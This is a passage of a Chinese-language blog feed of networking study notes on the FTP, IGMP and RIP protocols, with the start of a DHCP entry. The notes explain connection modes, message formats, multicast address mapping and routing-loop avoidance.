        <content type="html"><![CDATA[<h2 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h2><p>[TOC]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#掌握FTP的工作原理</span><span class="token comment">#掌握FTP常用命令的使用方法及用途</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TFP简介："><a href="#TFP简介：" class="headerlink" title="TFP简介："></a>TFP简介：</h3><p><strong>FTP (File Transfer Protocol）服务：</strong></p><p>FTP是TCP/IP网络上两台计算机之间传送文件的协议，它是在Internet上最早使用的协议之一。</p><blockquote><p style="color:blue;">FTP客户机可以给服务器发出命令来下载文件、上传文件、创建或改变服务器上的目录</p></blockquote><ul><li>原来的FTP软件多是命令行操作，有了像Filezilla这样的图形界面软件，使用FTP传输变得方便易学。</li><li>大多数FTP服务面向大众，不需要身份认证，即“匿名FTP服务器”。</li></ul><blockquote><p style="color:orange;">FTP协议是应用层的协议，它基于运输层，负责进行文件的传输</p></blockquote><ul><li>FTP是一个8位的客户端-服务器协议，能操作任何类型的文件而不需要进一步处理。</li><li>FTP服务<strong>一般运行在TCP的20和21两个端口</strong>。端口20用于在客户端和服务器之间<strong>传输数据流</strong>，而端口21用于<strong>传输控制流</strong>，并且是命令通向ftp服务器的入口</li></ul><h3 id="两种TCP连接"><a href="#两种TCP连接" class="headerlink" title="两种TCP连接"></a>两种TCP连接</h3><blockquote><p>控制连接:建立之后一直持续到客户和服务器间的通信完成为止，用于传送控制命令，服务器使用21号端口</p></blockquote><blockquote><p>数据连接:根据通信的需要随时建立和释放，用于数据传输，服务器通常使用20号端口</p></blockquote><h5 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接:"></a>控制连接:</h5><p>创建步骤:服务器在熟知端口21发出被动打开，等待客户，客户使用临时端口发出主动打开。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/创建TCP连接.png" style="zoom:67%;" /><h5 id="数据连接："><a href="#数据连接：" class="headerlink" title="数据连接："></a>数据连接：</h5><ul><li><strong>主动模式</strong>(PORT)由服务器端向客户端发起数据连接</li><li><strong>被动模式</strong>(PASV)由客户端向服务器端发起数据连接</li></ul><blockquote><p style="color:orange;">主动模式是服务器主动连接客户的数据端口，被动模式是服务器被动地等待客户连接自己的数据端口</p></blockquote><h4 id="主动模式下的FTP服务"><a href="#主动模式下的FTP服务" class="headerlink" title="主动模式下的FTP服务"></a>主动模式下的FTP服务</h4><p><strong>PORT(主动)模式的默认数据端口是20，控制端口是21</strong></p><ul><li><strong>连接过程</strong><ul><li>连接时，客户端使用随机的端口N(N&gt;1024)连接服务器的控制端口21建立控制连接</li><li>然后客户端开放N+1号端口进行监听，并通过控制连接向服务器发送命令PORT N+1</li><li>服务器用自己的数据端口20连接到客户端的N+1端口，建立数据连接。</li></ul></li></ul><h5 id="主动模式存在的问题："><a href="#主动模式存在的问题：" class="headerlink" title="主动模式存在的问题："></a>主动模式存在的问题：</h5><blockquote><p style="color:orange;">PORT(主动)模式发送端口给服务器，由服务器连回客户端</p></blockquote><ol><li>如果客户端有防火墙，这样的连接会被认为是外部主机试图连接内部的主机，通常情况下是不允许的</li><li>为了解决这个问题，引入了PASV（被动）模式。</li></ol><h4 id="被动模式下的FTP服务"><a href="#被动模式下的FTP服务" class="headerlink" title="被动模式下的FTP服务"></a>被动模式下的FTP服务</h4><ul><li><p>连接过程</p><ul><li>连接时，客户端使用一个随机的端口N(N&gt;1024)连接服务器的21端口建立控制连接</li><li>通过控制连接向服务器发送命令PASV (被动模式)。</li><li>服务器使用一个随机的数据端口M(M&gt;1024)并通过控制连接发回客户端</li><li>客户端用数据端口N+1连接服务器的端口M。</li></ul><p>由于是客户端主动发起数据连接，这样就解决了防火墙带来的问题。</p></li></ul><h3 id="FTP通信："><a href="#FTP通信：" class="headerlink" title="FTP通信："></a>FTP通信：</h3><p><strong>控制连接上的通信：</strong>FTP使用NVT ASCII字符集在控制连接上通信。通信过程使用命令和响应来完成，命令和响应都是一个短行，因此不必考虑它的文件结构。每一行以回车换行结束</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP控制链路上的通信.png" style="zoom:50%;" /><p><strong>数据连接上的通信：</strong>在传送数据之前，客户使用控制连接来做传输准备，定义文件类型、数据结构、传输方式</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP数据连接上的通信.png" style="zoom:50%;" /><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ol><li>ASCII文件:传送文本文件的默认格式。每一个字符使用NVT ASCII进行编码。发送端把文件从它自己的表示转换成NVT ASCII字符，而接收端从NVT ASCII字符转换成它自己的字符</li><li>EBCDIC文件:若连接的一端或两端使用EBCDIC编码，则可使用EBCDIC编码传送文件</li><li>图像文件:传送二进制文件的默认格式。这种文件是作为连续的比特流传送而没有任何解释或编码。在大多数情况下它用来传送二进制文件，如已编译的程序。</li></ol><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><ul><li>文件结构（默认)︰这种文件没有结构，它是连续的字节流</li><li>记录结构:这种文件划分为一些记录，这只能用于文本文件</li><li>页面结构:这种文件划分为一些页面，每一个页面有页面号和页面首部。页面可以随机地或顺序地进行存取</li></ul><h4 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h4><blockquote><p>流方式:这是默认方式。数据作为连续的字节流从FTP交付给TCP。TCP负责把数据划分为适当大小的报文。若数据是简单的字节流（文件结构），就不需要文件结束符。若数据划分为记录（记录结构)，则每一个记录有1字节的记录结束（EOR）字符，而在文件的结束处有文件结束（EOF）字符。</p></blockquote><blockquote><p>块方式:数据可以按块从FTP交付给TCP。每一个块的前面有3字节首部。第一个字节叫做块描述符，后两个字节定义块的大小，以字节为单位。</p></blockquote><blockquote><p>压缩方式:若文件很大，数据可进行压缩。通常使用的压缩方法是游程长度编码。数据单元的连续出现数可以用一个“出现”和“重复数”来替换。在文本文件中，这通常是空格。在二进制文件中，空字符常常被压缩。</p></blockquote><h4 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h4><blockquote><p>从服务器把文件复制到客户端叫做<strong>读取</strong>文件，使用RETR命令完成</p></blockquote><blockquote><p>从客户端把文件复制到服务器叫做<strong>存储</strong>文件，使用STOR命令完成。</p></blockquote><p>从服务器向客户端发送目录列表或文件名，使用LIST命令完成。FTP把目录或文件名列表当作文件，在数据连接上发送。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP文件传送.png" style="zoom:67%;" /><h3 id="FTP响应与命令："><a href="#FTP响应与命令：" class="headerlink" title="FTP响应与命令："></a>FTP响应与命令：</h3><blockquote><p style="color:blue;">FTP使用控制连接在客户进程和服务器进程之间完成交互操作，客户端向服务器发送命令，服务器给客户返回响应</p></blockquote><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><ul><li>命令形式是ASCII大写字符，后面的变量可以有，也可以没有。</li><li>命令可以粗略地划分为6组:接口命令、文件管理命令、数据格式化命端口定义命令、文件传送命令以及杂项命令。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP命令.png" style="zoom: 50%;" /><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><blockquote><p style="color:blue;">每一个FTP命令都应该有响应。响应由两个部分组成:3个数字以及跟随在后面的文本。数字部分定义代码，文本部分定义所需的参数或额外的解释</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP相应.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Internet组管理协议IGMP</title>
      <link href="/2022/11/16/IGMP/"/>
      <url>/2022/11/16/IGMP/</url>
      
        <content type="html"><![CDATA[<h2 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a>Internet组管理协议IGMP</h2><p>[TOC]</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握IGMP协议的报文格式</span><span class="token comment"># 掌握IGMP协议的工作原理</span><span class="token comment"># 理解多播组地址到以太网地址的映射</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单播与多播与广播"><a href="#单播与多播与广播" class="headerlink" title="单播与多播与广播:"></a>单播与多播与广播:</h3><blockquote><p style="color:red;">单播(unicast):    单个源站与单个目的站之间的通信叫作单播，IP数据报中的源IP地址和目的IP地址分别代表了源站和目的站。</p></blockquote><blockquote><p style="color:blue;">绝大多数的网络应用程序是单播</p></blockquote><blockquote><p style="color:red;">多播/组播(multicast): 一个源站和多个目的站之间的通信叫作多播。</p></blockquote><blockquote><ul><li>IP数据报中的源地址是单播地址，目的地址是组地址(D类地址)</li><li>路由器收到组播数据包后，可从它的多个接口转发出去<br>目前，组播机制没有被广泛支持，主要的组播路由机制有距离向量多播路由协议(DVMRP)和协议无关组播(PIM) .</li></ul></blockquote><blockquote><p style="color:red;">广播(broadcast):广播源站和目的站是一对多的，源站只有一个，但所有其它主机都是目的站Internet不支持广播，因为这会产生非常大的通信量</p></blockquote><h4 id="组播"><a href="#组播" class="headerlink" title="组播:"></a>组播:</h4><p>优点：采用组播技术后，即使用户数量成倍增长，主干网带宽不需要随之增加。从而解决了宽带应用对带宽和服务质量的要求问题</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/组播示意.png" style="zoom: 33%;" /><p>组播比多个单播具有更小的分组时延</p><h5 id="组播地址范围："><a href="#组播地址范围：" class="headerlink" title="组播地址范围："></a>组播地址范围：</h5><blockquote><ol><li>IANA(国际因特网地址分配委员会）把D类地址空间用于IP组播地址</li><li>IP组播地址的范围是:224.0.0.0~239.255.255.255</li><li>常用的组播地址<ul><li>224.0.0.1        在本子网上的所有参加多播的主机和路由器</li><li>224.0.0.2        在本子网上的所有参加多播的路由器</li><li>224.0.0.5        用来给一个网段中所有的OSPF路由器发送OSPF路由信息</li><li>224.0.0.9        RIPv2组地址</li><li>224.0.0.11      供DHCP服务器和中继代理使用</li></ul></li></ol></blockquote><h5 id="动态的组成员"><a href="#动态的组成员" class="headerlink" title="动态的组成员"></a>动态的组成员</h5><blockquote><p style="color:orange;">多播组中的成员是动态的。一个进程可请求其主机参加某个特定组，或在任意时间退出该组</p></blockquote><h5 id="使用硬件进行多播"><a href="#使用硬件进行多播" class="headerlink" title="使用硬件进行多播"></a>使用硬件进行多播</h5><blockquote><p style="color:orange;">当数据报传送到以太网时，以太网利用硬件进行多播，交付给属于该组成员的主机</p></blockquote><h4 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h4><p>多播以太网地址的前25位是0000000100000000010111100这意味着与IP多播相对应的以太网地址范围从01005E000000到01005E7FFFFF。然后将多播IP地址的低23位映射到以太网地址中的低23位。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/多播地址到以太网地址的转换.png" style="zoom: 50%;" /><p>由于D类地址的组标识字段长为28bit，将低23位复制到多播MAC地址中，有5bit未使用，所以<strong>映射是多对一的</strong>。</p><p><strong>32个多播IP地址映射到一个以太网多播地址</strong>。既然地址映射不是惟一的，那么设备驱动程序或lP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能,设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</p><h3 id="IGMP协议简介："><a href="#IGMP协议简介：" class="headerlink" title="IGMP协议简介："></a>IGMP协议简介：</h3><p>IGMP ( lnternet Group Management Protocol)协议，IGMP位于网络层。</p><p style="color:orange;">IGMP协议运行于主机和主机直接相连的路由器之间，是IP主机用来报告多播组成员身份的协议</p>利用IGMP协议，一方面可以使主机通知本地路由器希望加入并接收某个特定多播组的信息;另一方面，路由器可以周期性地查询局域网内某个已知组的成员是否处于活动状态。IGMP使用预留的组播地址224.0.0.1与本地路由器通信。<h3 id="IGMP报文格式："><a href="#IGMP报文格式：" class="headerlink" title="IGMP报文格式："></a>IGMP报文格式：</h3><p>IGMP协议目前有三个版本IGMP、IGMPv2和IGMPv3。</p><p>其中IGMPv2有3种报文类型:</p><blockquote><p>查询报文:路由器查询多播组中是否有活跃成员，分为一般查询和特定查询</p><p>成员关系报告报文:加入多播组或响应查询报文。</p><p>退出报告报文:离开多播组。</p></blockquote><h4 id="IGMPv2报文格式："><a href="#IGMPv2报文格式：" class="headerlink" title="IGMPv2报文格式："></a>IGMPv2报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/IGMPv2报文格式.png" style="zoom:67%;" /><ol><li><p>类型:定义了IGMP报文类型</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/IGMP报文类型.png" style="zoom: 80%;" /></li><li><p>响应时间:规定查询必须在多长时间内回答，以十分之一秒为单位。默认值为10秒。在查询报文中，这个值不为0，在其它报文中此字段值为0</p></li><li><p>检验和:对整个IGMP报文进行检验，算法同IP数据报</p></li><li><p>组地址:在一般查询报文中值为0。在特殊的查询报文、成员关系报告报文以及退出报文中值为相应的多播组地址</p></li></ol><h4 id="IGMP的封装"><a href="#IGMP的封装" class="headerlink" title="IGMP的封装"></a>IGMP的封装</h4><p>IGMP报文被封装在IP数据报中，IP层有3个字段需要注意:</p><blockquote><ul><li>协议类型:值为2，高层协议类型为2的IP数据包，其数据部分要交给IGMP协议处理。</li><li>生存时间:值为1，保证了这个报文不离开这个局域网。因为IGMP的作用范围是局域网，IGMP报文不能够发送到局域网以外的地方。</li><li>目的IP地址:为D类组播地址。</li></ul></blockquote><h3 id="多播组成员的加入和退出："><a href="#多播组成员的加入和退出：" class="headerlink" title="多播组成员的加入和退出："></a>多播组成员的加入和退出：</h3><h4 id="加入一个组"><a href="#加入一个组" class="headerlink" title="加入一个组"></a>加入一个组</h4><p>每个主机维护一张成员关系表，成员关系表是**&lt;进程名，组名&gt;<strong>表项的集合。当一个进程P要加入一个新组MG时，就向主机发出申请，主机就在成员关系表中增加</strong>&lt;P, MG&gt;**表项。</p><blockquote><ul><li>如果MG在表中不存在，主机就发送成员关系报告报文</li><li>如果MG在表中已经存在，那就不必发送成员关系报告报文，因为主机已经是MG这个组的成员了</li></ul></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/加入多播组.png" style="zoom:67%;" /><p>路由器也维护一个多播地址表，给出了连接到每一个接口的成员关系。如果对于这些接口中的一个组有兴趣时，路由器就发送成员关系报告报文，以记录连接在它的接口上的所有的多播组。<br>IGMP协议要求把成员关系报告报文在很短的时间内发送两次。这样，如果第一个报文丢失或受到损伤，那么第二个报文可以代替它。</p><h4 id="退出一个组"><a href="#退出一个组" class="headerlink" title="退出一个组"></a>退出一个组</h4><ol><li><p>当主机发现在一个群组MG中已经没有进程时，就发送退出报告报文，多播路由器收到该报告。当路由器发现在一个特定组中已经没有连接在它的接口上感兴趣的网络，它就发送退出这个组的报告。</p></li><li><p>多播路由器收到退出报告报文时，并不立即删除这个群组MG，而是发送针对MG的查询报文，因为这个退出群组报告仅仅是从一个站点发送来的，可能还有其他站点仍然需要这个群组。</p></li><li><p>若在指定时间内没有收到站点对该群组的成员关系报告，就意味着在本网络上没有这个群组MG的成员，删除这个群组。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/退出多播组.png" style="zoom:67%;" /></li></ol><h4 id="监视组成员关系"><a href="#监视组成员关系" class="headerlink" title="监视组成员关系"></a>监视组成员关系</h4><blockquote><ul><li>当仅有一台主机留在一个组中时，如果这台主机离开了这个组而没有发送退出报告报文，那么多播路由器将永远收不到退出报告报文，它认为这个组一直存在这个成员。</li></ul></blockquote><p>多播路由器负责监视局域网上的所有主机或路由器,多播路由器周期性地发送<strong>一般查询报文</strong>，在这个报文中，组地址被置为<strong>0.0.0.0</strong>。</p><p>路由器期望着在它的组表中的每一个组的回答，甚至新的组也可以回答。查询报文的最大响应时间是10秒。当主机路由器收到一般查询报文时，如果它对一个组感兴趣，就发送成员关系报告报文。</p><h4 id="延迟响应"><a href="#延迟响应" class="headerlink" title="延迟响应"></a>延迟响应</h4><blockquote><p style="color:blue;">IGMP使用延迟响应策略，避免不必要的通信量。当主机或路由器收到查询报文时，它不是立即响应，而是延迟响应</p></blockquote><p>主机或路由器使用一个随机数产生计时器，它的截止时间是1～10秒。截止时间可以使用1秒或更短的步长。</p><p>表中的每一个组都设置计时器。每个主机或路由器在发送成员关系报告报文之前都要等待它的计时器到时。在这段等待时间中，如果在同一组中的其它主机或路由器的计时器先到了截止时间，那么这个主机或路由器就发送成员关系报告报文。因为这个报文是广播发送的，等待的主机或路由器都能收到这个报文，并知道没有必要对这个组发送重复的报文;因此，等待的主机或路由器就取消发送成员关系报告。</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由信息协议RIP</title>
      <link href="/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><p>[TOC]</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握路由协议的分类，理解静态路由和动态路由</span><span class="token comment">#掌握动态路由协议RIP的报文格式、工作原理及工作过程</span><span class="token comment">#掌握RIP计时器的作用</span><span class="token comment">#理解RIP的稳定性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、路由分类："><a href="#一、路由分类：" class="headerlink" title="一、路由分类："></a>一、路由分类：</h3><h4 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h4><h5 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择:"></a>路由选择:</h5><blockquote><p>在从源点到终点的通信过程中，数据包可能经过多个路由器，直到到达连接，目的网络路由器为止。<br>当路由器收到数据包时，它应当将数据包转发到哪一个网络，取决于路由表的信息。</p></blockquote><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表:"></a>路由表:</h5><blockquote><p>静态路由表:路由信息是管理员设置的，并由管理员手动进行更新。</p></blockquote><blockquote><p>动态路由表:路由信息是随着互联网的变化而自动更新的。</p></blockquote><p>**路由选择协议:**路由选择协议是一些规则和过程的组合。规则使得路由器之间能够共享他们所知道的互联网情况和邻站信息，而过程用来合并从其它路由器收到的信息。</p><h4 id="外部和内部路由选择："><a href="#外部和内部路由选择：" class="headerlink" title="外部和内部路由选择："></a>外部和内部路由选择：</h4><p><strong>自治系统（AS,Autonomous System)</strong><br>由同一个管理机构管理、使用统一路由策略的路由器的集合。<br>最初，自治系统内部只考虑运行单个路由协议;然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/自治系统.png" style="zoom:67%;" /><h5 id="两大类路由选择协议"><a href="#两大类路由选择协议" class="headerlink" title="两大类路由选择协议"></a>两大类路由选择协议</h5><p><strong>内部网关协议IGP(Interior Gateway Protocol)：</strong></p><blockquote><p style="color:blue;">内部网关协议IGP(Interior Gateway Protocol):在一个自治系统内部使用的路由选择协议</p>- 目前这类路由选择(域内路由选择)协议使用得最多，如**RIP**和**OSPF协议**。</blockquote><p><strong>外部网关协议EGP(External Gateway Protocol):</strong></p><blockquote><p style="color:blue;">外部网关协议EGP(External Gateway Protocol):在自治系统之间使用的路由选择协议</p>- 在外部网关协议中目前使用最多的是**BGP-4**协议</blockquote><h5 id="距离向量路由选择协议"><a href="#距离向量路由选择协议" class="headerlink" title="距离向量路由选择协议:"></a>距离向量路由选择协议:</h5><ol><li>从路由器到直接连接的网络的距离定义为1</li><li>从路由器到非直接连接的网络的距离定义为所经过的路由器数加1，因此也称为“跳数”</li><li>每个节点维护一个到其它节点的最小距离向量表</li><li>初始状态下，每个节点只知道到与它直接相连的节点的代价</li><li>节点周期性地向其所有相邻节点发送它的路由表信息</li><li>当一个节点从邻站收到路由表信息时，使用<strong>Bellman-Ford算法</strong>更新其路由表</li></ol><h3 id="二、RIP协议："><a href="#二、RIP协议：" class="headerlink" title="二、RIP协议："></a>二、RIP协议：</h3><h4 id="2-1：路由信息协议-Routing-Information-Protocol"><a href="#2-1：路由信息协议-Routing-Information-Protocol" class="headerlink" title="2.1：路由信息协议(Routing Information Protocol)"></a>2.1：路由信息协议(Routing Information Protocol)</h4><p>应用较早、使用较普遍的<strong>内部网关协议</strong>，适用于小型同类网络，是典型的<strong>距离向量路由协议</strong>。</p><blockquote><ul><li><p style="color:orange;">通过广播UDP协议520端口封装成的报文来交换路由信息，默认每30秒发送一次路由信息更新报文</p></li><li><p style="color:orange;">RIP使用跳数作为路由距离度量，即数据报到达目标设备所必须经过的路由器数目</p></li><li><p style="color:orange;">RIP最多支持的跳数为15，跳数16表示不可达</p></li></ul></blockquote><h5 id="RIP的工作原理"><a href="#RIP的工作原理" class="headerlink" title="RIP的工作原理"></a>RIP的工作原理</h5><ol><li>路由器启动时，路由表中只包含直通路由。运行RIP后，路由器会发送Request报文，用来请求邻居路由器的RIP路由</li><li>运行RIP的邻居路由器收到该Request报文后，会根据自己的路由表，生成Response报文进行回复</li><li>路由器在收到Response报文后，会将相应的路由添加到自己的路由表中</li><li>RIP网络稳定以后，每个路由器会<strong>周期性</strong>的向<strong>邻居路由器</strong>通稿自己的<strong>整张路由表</strong>中的路由信息，默认周期为30秒。邻居路由器根据收到的路由信息刷新自己的路由表</li><li>路由表中的每一路由项都对应了一个老化定时器，当路由项在180秒内没有任何更新时，定时器超时，该路由项的度量值变为不可达</li><li>某路由项的度量值变为不可达后，该路由会在Response报文中发布四次(120秒)，然后从路由表中清除。</li></ol><h5 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h5><p>仅和相邻路由器交换信息。</p><pre class="line-numbers language-none"><code class="language-none">交换的信息是当前本路由器所知道的全部信息，即自己的路由表按固定的时间间隔交换路由信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RIPv1-vs-RIPv2"><a href="#RIPv1-vs-RIPv2" class="headerlink" title="RIPv1 vs RIPv2"></a>RIPv1 vs RIPv2</h5><p><strong>RIPv1</strong></p><blockquote><p style="color:orange;">有类别路由协议，不支持VLSM和CIDR且不支持认证。以广播的形式发送报文，目的IP地址为广播地址255.255.255.255</p></blockquote><p><strong>RIPv2</strong></p><blockquote><p style="color:orange;">无类别路由协议，支持VLSM、路由聚合与CIDR，支持明文认证和MD5密文认证，以广播或者组播(224.0.0.9)方式发送报文</p></blockquote><h4 id="2-2：RIP协议报文格式："><a href="#2-2：RIP协议报文格式：" class="headerlink" title="2.2：RIP协议报文格式："></a>2.2：RIP协议报文格式：</h4><h5 id="RIPv1的报文格式："><a href="#RIPv1的报文格式：" class="headerlink" title="RIPv1的报文格式："></a>RIPv1的报文格式：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/RIPv1的报文格式.png" style="zoom:67%;" /><p> 每个字段的值和作用</p><blockquote><p>Command:表示该报文是一个请求报文还是响应报文，1表示该报文是请求报文，2表示该报文是响应报文</p><p>Version:表示RIP的版本信息。对于RIPv1，该字段的值为1</p><p>Address Family ldentifier (AFI):表示地址标识信息，对于IP协议，其值为2</p><p>lP address:表示该路由条目的目的IP地址。这一项可以是网络地址、主机地址</p><p>Metric:路由条目的度量值，取值范围1-16。</p></blockquote><blockquote><p style="color:blue;">一个RIP路由更新消息中最多可包含25条路由表项，每个路由表项都携带了目的网络的地址和度量值。整个RIP报文大小限制为不超过504字节，如果整个路由表的更新消息超过该大小，需要发送多个RIPv1报文</p></blockquote><h5 id="RIPv2的报文格式："><a href="#RIPv2的报文格式：" class="headerlink" title="RIPv2的报文格式："></a>RIPv2的报文格式：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/RIPv2的报文格式.png" style="zoom: 50%;" /><p><strong>RIPv1与RIPv2的不同的字段</strong></p><blockquote><p>AFI:地址族标识除了表示支持的协议类型外，还可以用来描述认证信息<br>Route tag:用于标记外部路由。<br>Subnet Mask:指定IP地址的子网掩码，定义IP地址的网络或子网部分<br>Next Hop:指定通往目的地址的下—跳IP地址。</p></blockquote><h3 id="三、RIP环路："><a href="#三、RIP环路：" class="headerlink" title="三、RIP环路："></a>三、RIP环路：</h3><p>RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络，度量值为2。<br>此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><h4 id="环路避免-水平分割"><a href="#环路避免-水平分割" class="headerlink" title="环路避免-水平分割"></a>环路避免-水平分割</h4><p>路由器从某个接口学到的路由，不会从该接口再发回给邻居路由器。</p><blockquote><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/水平分割.png" style="zoom:67%;" /><h4 id="环路避免-毒性反转"><a href="#环路避免-毒性反转" class="headerlink" title="环路避免-毒性反转"></a>环路避免-毒性反转</h4><p>毒性反转机制的实现可以使错误路由立即超时。<br>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/毒性反转.png" style="zoom:67%;" /><h4 id="环路避免-触发更新"><a href="#环路避免-触发更新" class="headerlink" title="环路避免-触发更新"></a>环路避免-触发更新</h4><p style="color:skyblue;">触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不需要等待更新定时器超时，从而加速了网络收敛</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/触发更新.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态主机配置协议DHCP</title>
      <link href="/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/"/>
      <url>/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/</url>
      
        <content type="html"><![CDATA[<h3 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h3><p>[TOC]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#掌握DHCP的报文格式</span><span class="token comment">#掌握DHCP的工作原理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="DHCP简介："><a href="#DHCP简介：" class="headerlink" title="DHCP简介："></a>DHCP简介：</h4><blockquote><p style="color:blue;">动态主机配置协议(Dynamic Host Configuration Protocol )是一种动态指定IP地址的机制</p></blockquote><ul><li>DHCP服务器能自动为客户端分配IP地址，减少了客户机IP地址配置的复杂度和管理开销</li><li><strong>DHCP服务器</strong>是安装了DHCP服务器软件的计算机，可在网络中设置一台或多台</li></ul><p>分配给客户的IP是临时的，DHCP客户只能在有限的时间内使用该IP，这段时间称为<strong>租用期</strong><br>租用期的数值应由DHCP服务器决定(默认1小时)，DHCP客户也可在自己发送的报文中提出对租用期的要求。<br>当租期到了的时候，服务器可以把这个IP地址分配给别的主机使用。</p><blockquote><p style="color:orange;">DHCP使用UDP协议封装，使用UDP的熟知端口67和68，68是DHCP请求报文中的源端口，67是DHCP服务器的目标端口</p></blockquote><h4 id="DHCP报文格式："><a href="#DHCP报文格式：" class="headerlink" title="DHCP报文格式："></a>DHCP报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP报文格式.png" style="zoom:50%;" 